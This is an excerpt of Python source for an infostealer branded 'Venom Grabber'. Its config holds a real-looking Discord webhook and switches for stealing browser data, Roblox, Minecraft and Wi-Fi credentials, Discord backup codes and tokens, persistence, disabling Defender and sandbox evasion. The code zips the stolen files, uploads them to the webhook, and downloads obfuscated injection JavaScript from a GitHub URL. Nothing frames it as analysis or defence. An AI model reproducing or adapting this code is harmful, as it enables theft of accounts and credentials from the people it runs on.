...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1116466967554052107/ezqYWO4T0CPlP8ubYG59C5jFG9QWA6pE3byqOylP5aA3fGP0VRfR9bCCfuvG9Xn8_NHU', 'ping': True, 'pingtype': 'Here', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False}
...
def main(webhook: str):
    ...
    data = {
        "username": "Venom Logs",
        "avatar_url": "https://i.ibb.co/qmbd6wk/image.png"
    }

    _file = f'{localappdata}\\Logged-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Bot-Based Venom Grabber | Created By Jiggy and SpyDrone"
                    },
                    "thumbnail": {
                        "url": "https://i.ibb.co/qmbd6wk/image.png"
                    }
                }
            ],
            "username": "Venom Logs",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/VenomTool/Venom-Injection/main/obfuscated-injection.js').text
...
class Debug:
    ...
    def checks(self):
        ...
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58']
